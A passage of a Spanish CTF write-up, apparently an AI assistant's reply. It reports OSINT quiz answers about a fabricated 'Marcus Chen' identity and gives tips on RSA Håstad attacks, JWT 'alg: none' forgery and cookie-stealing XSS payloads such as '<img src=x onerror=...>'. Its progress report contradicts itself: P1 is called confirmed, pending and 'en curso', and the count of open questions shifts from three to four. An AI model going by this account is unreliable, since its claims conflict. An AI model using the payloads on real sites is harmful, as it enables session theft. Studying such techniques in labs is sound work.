| 10 | Fecha y hora exacta (UTC) de creación del dominio chainvaultsolutions.io, según WHOIS | ✅ | `2024-11-15T14:23:07` |
| 11 | Código de riesgo de tres letras que SpiderFoot asigna a Marcus Chen | ✅ | `CRT` |

**8 de 11 confirmadas; P1, P7 y P8 siguen pendientes (P1 tiene una respuesta candidata aún sin validar en el formato exacto que pide la pregunta).**

**Cómo se llegó a cada respuesta confirmada (el razonamiento, no solo el dato):**

- **P1 (estado MIT — "UNVERIFIED")**: la pista "Search Analysis Alert" no era el nombre literal de ningún documento ni pestaña — tras revisar File Manager, PDFs (`risk-assessment.pdf`, carpeta Documents con `business-registry-searches.txt`, `mit-verification-request.txt`, etc.), Maltego CE y SpiderFoot sin encontrar ese título exacto, la respuesta apareció en el **File Manager**, dentro de la carpeta "Evidence", en el archivo `investigation-summary.md`. Ese informe consolidado incluía la sección "Identity Verification" con la línea literal `MIT education claim: UNVERIFIED`, que encajaba con lo que pedaía la pregunta aunque el nombre "Search Analysis Alert" no apareciera tal cual en ningún título de archivo — la lección aquí es que el nombre de una pregunta no siempre coincide con el título literal de la fuente; a veces hay que identificar «el contenido que responde a lo que se pide», no solo «buscar ese string exacto».
- **P4 y P5 (Shutterstock #2847293 / nombre de archivo original)**: estaban en la pestaña **"Red Flags"** del Case Manager (la lista de 20 hallazgos), y se confirmaron/ampliaron después en **LinkedIn Analyzer**, que mostraba el ID de stock photography y el nombre de archivo original de la foto de perfil, coherentes entre sí (el mismo número `2847293` aparece en ambos).
- **P6 (4% de conexiones verificadas)**: también en LinkedIn Analyzer, en el bloque "Connection Authenticity Report".
- **P9, P10 y P11 (registrador WHOIS, fecha de creación del dominio, código de riesgo CRT)**: las tres se resolvieron de golpe en **SpiderFoot**, revisando la pestaña de resultados de dominio/WHOIS y el "Overall Risk Assessment" al final del escaneo automatizado — SpiderFoot agrupaba esta información en un mismo bloque de resultados.

**P2 y P3 (Google Scholar), cómo se resolvieron:** se buscó directamente en la página de resultados de Google Scholar dentro de la máquina simulada, filtrando por publicaciones de Marcus Chen afiliado a MIT en blockchain/criptografía (2012-2024). La búsqueda devolvió **0 citas totales** (P2) y, para la búsqueda de artículos que lo mencionen en relación con logros en blockchain, el propio sitio mostraba literalmente el mensaje **`No publications matching search criteria.`** (P3) — ambos datos refuerzan la misma conclusión que P1 (registros MIT no verificados): no hay ningún rastro académico real de Marcus Chen.

**P1 — en curso:** se abrió el **Case Manager** del escritorio. La pestaña "Evidence" (5 elementos) no respondía al clic sobre la tarjeta completa del primer item (EV001, LinkedIn MIT), así que se probó a hacer clic directamente sobre el texto azul "EV001" (que parece ser el enlace real). La pestaña "Red Flags" (20 elementos) sí respondió y ahí apareció la red flag "MIT education claim cannot be verified" — que coincide en significado con P1 pero no es el texto exacto corto tipo código de estado que pide la pregunta, así que se sigue buscando en **LinkedIn Analyzer** (que ya confirmó P4 y P6) a ver si ahí aparece el estado exacto de los registros MIT.

**Por qué P7 y P8 siguen abiertas:** requieren entrar en el repositorio `quantum-blockchain-protocol` de "marcuschen-blockchain" — la URL no es navegable directamente escribiéndola (el entorno es una simulación cerrada, no un GitHub real), así que hay que localizar esos datos a través de algún panel/informe dentro de la propia interfaz de la máquina, de forma análoga a cómo fue apareciendo el resto de evidencia.

**Conclusión provisional (con los datos confirmados hasta ahora):** todos los indicios apuntan de forma consistente a que "Marcus Chen" / ChainVault Solutions es una identidad fabricada: credenciales MIT no verificables, foto de perfil de stock, red de conexiones de LinkedIn mayoritariamente falsa (solo 4% verificadas), dominio registrado recientemente, y SpiderFoot clasificándolo con un código de riesgo (`CRT`). Falta cerrar las 4 preguntas pendientes para completar el cuestionario.

## Cómo reconocer estos patrones en futuros retos

Esta es la parte que convierte un write-up en aprendizaje real: no memorizar la solución concreta, sino quedarte con la **señal** que te dice "aquí puede haber este fallo". Para cada categoría, lo que debería encender la bombilla:

### Crypto — RSA

- **Ves un `e` pequeño (3, 5, 11...) en el código** → piensa inmediatamente en ataques de exponente bajo (raíz directa si el mensaje es corto, o Håstad si puedes pedir el mismo mensaje cifrado varias veces).
- **El servicio te deja cifrar el mismo secreto repetidas veces y cada vez cambia `n`** → es la firma del ataque de Håstad por broadcast. Cuenta cuántos cifrados necesitas: tantos como valga `e`.
- **El enunciado insiste mucho en una característica ("usa PKCS#7", "padding extra seguro")** → desconfía: en CTF, lo que el enunciado subraya suele ser la distracción, y el fallo real está en otro detalle del código (aquí, el `e=11` reutilizado).
- **Herramienta mental:** antes de atacar, léete siempre el código fuente y apúnta los valores fijos (`e`, tamaño de clave, si `n` cambia o no, si el mensaje es constante). El vector casi siempre sale de ahí.

### Web/Crypto — JWT

- **La app usa JWT y hay más de una función que "decodifica" tokens** (`verify_x` vs `decode_x`, `parse` vs `validate`) → sospecha: puede que solo una compruebe la firma, y que algn endpoint use la equivocada.
- **Comentarios tipo "ya se verificó antes, no hace falta de nuevo"** → bandera roja gigante: alguien asumió una garantía que no se cumple.
- **Prueba siempre `alg: none`** antes de nada (y también `alg: HS256` firmado con la clave pública RSA si el server usa RS256). Herramientas como `jwt_tool` o la extensión "JWT Editor" de Burp lo prueban automáticamente.
- **Si tu exploit da 500 en vez de funcionar o fallar limpiamente** → no asumas que el ataque está mal: monta el reto en local para ver el traceback. Aquí el fallo era base64url vs base64 estándar, algo invisible sin el error completo delante.

### Web — XSS con bot

- **Ves `bot.js`, `puppeteer`, `page.goto`, `setCookie` en el código** → hay un bot admin que visita URLs con algo valioso en la sesión. El objetivo casi seguro es robarle la cookie vía XSS.
- **El razonamiento se repite siempre en 4 preguntas:** ¿quién visita qué? → ¿qué parámetro controlo yo? → ¿dónde se imprime algo mío sin escapar? → ¿cómo encadeno uno con otro?
- **Busca `innerHTML`, `document.write`, `eval`, o plantillas sin autoescape** → son los sitios donde el texto se interpreta como código. Si además un valor de la URL llega ahí sin filtrar, tienes el XSS.
- **Payload sin `<script>`:** usa `<img src=x onerror=...>` o `<svg onload=...>`, que evitan filtros que solo bloquean `<script>` y no requieren interacción.

### OSINT

- **No existe "la respuesta" en un solo sitio:** cada dato se corrobora cruzando varias herramientas (verificación académica, búsqueda inversa de imagen, metadatos, WHOIS, análisis de repos). Un solo indicio no prueba fraude; el conjunto consistente, sí.
- **El nombre de la pregunta no siempre coincide con el título literal de la fuente:** a veces tienes que identificar "el contenido que responde a lo que se pide", no buscar ese string exacto (como pasó con P1 y la "Search Analysis Alert").
- **Los metadatos y el WHOIS son oro:** nombre de archivo original de una foto, fecha de registro de un dominio, email del primer commit — son datos que delatan una identidad fabricada aunque la fachada parezca pulida.

Si quieres, puedo ampliar cualquiera de los cuatro retos aún más a fondo (por ejemplo, el desarrollo matemático completo del CRT paso a paso con números pequeños de ejemplo, o montar el laboratorio del JWT en local comando a comando). Dime cuál te interesa más.
